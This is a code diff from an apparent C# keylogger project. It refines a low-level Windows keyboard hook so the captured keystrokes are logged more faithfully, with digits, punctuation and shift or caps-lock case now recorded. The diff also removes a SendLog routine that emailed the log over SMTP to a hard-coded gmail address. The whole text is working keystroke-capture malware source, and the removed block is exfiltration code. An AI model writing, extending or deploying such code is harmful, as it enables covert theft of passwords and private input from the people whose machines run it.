@@ -16,7 +16,6 @@ namespace KeyLogger
 		private const int WM_KEYDOWN = 0x0100;
 		private static readonly LowLevelKeyboardProc _proc = HookCallback;
 		private static IntPtr _hookID = IntPtr.Zero;
-		private static StreamWriter _logFile;
 
 		[STAThread]
 		public static void Main()
@@ -51,15 +50,72 @@ namespace KeyLogger
 					switch (vkCode)
 					{
 						case Keys.Space:
-							// writer.WriteAsync(String.Format(" {0} ", ((Keys)vkCode)));
 							writer.WriteAsync(" ");
 							break;
 						case Keys.Return:
-							// writer.WriteAsync(String.Format("\n {0} \n", ((Keys)vkCode)));
 							writer.WriteAsync("\n");
 							break;
+						case Keys.LShiftKey: case Keys.RShiftKey:
+							writer.WriteAsync("");
+							break;
+						case Keys.D1:
+							writer.WriteAsync("1");
+							break;
+						case Keys.D2:
+							writer.WriteAsync("2");
+							break;
+						case Keys.D3:
+							writer.WriteAsync("3");
+							break;
+						case Keys.D4:
+							writer.WriteAsync("4");
+							break;
+						case Keys.D5:
+							writer.WriteAsync("5");
+							break;
+						case Keys.D6:
+							writer.WriteAsync("6");
+							break;
+						case Keys.D7:
+							writer.WriteAsync("7");
+							break;
+						case Keys.D8:
+							writer.WriteAsync("8");
+							break;
+						case Keys.D9:
+							writer.WriteAsync("9");
+							break;
+						case Keys.D0:
+							writer.WriteAsync("0");
+							break;
+						case Keys.Oemcomma:
+							writer.WriteAsync(",");
+							break;
+						case Keys.OemPeriod:
+							writer.WriteAsync(".");
+							break;
+						case Keys.OemQuestion:
+							writer.WriteAsync("?");
+							break;
+						case Keys.OemMinus:
+							writer.WriteAsync("-");
+							break;
+						case Keys.Oemplus:
+							writer.WriteAsync("+");
+							break;
 						default:
-							writer.WriteAsync(vkCode.ToString());
+							if ((Control.ModifierKeys & Keys.Shift) != 0)
+							{
+								writer.WriteAsync(vkCode.ToString());
+							}
+							else if ((Control.ModifierKeys & Keys.CapsLock) != 0)
+							{
+								writer.WriteAsync(vkCode.ToString());
+							}
+							else
+							{
+								writer.WriteAsync(vkCode.ToString().ToLower());
+							}
 							break;
 					}
 				}
@@ -67,38 +123,6 @@ namespace KeyLogger
 			}
 
 			return CallNextHookEx(_hookID, nCode, wParam, lParam);
-		}
-
-		public static void SendLog()
-		{
-			// TODO: need normal smtp server
-			using (var mail = new MailMessage
-			{
-				From = new MailAddress("***"), // from mail adress *@mail.com
-				To =
-				{
-					"mazillko@gmail.com"
-				},
-				Subject = "Log",
-				Body = "..."
-			})
-			{
-				using (var smtpServer = new SmtpClient("***") // smtp server 
-				{
-					Port = 465,
-					Credentials = new NetworkCredential("***", "***") // user and password
-				})
-				{
-					try
-					{
-						smtpServer.Send(mail);
-					}
-					catch (Exception ex)
-					{
-						Console.WriteLine(ex.Message);
-					}
-				}
-			}
 		}
 
 		#region WinApi Functions
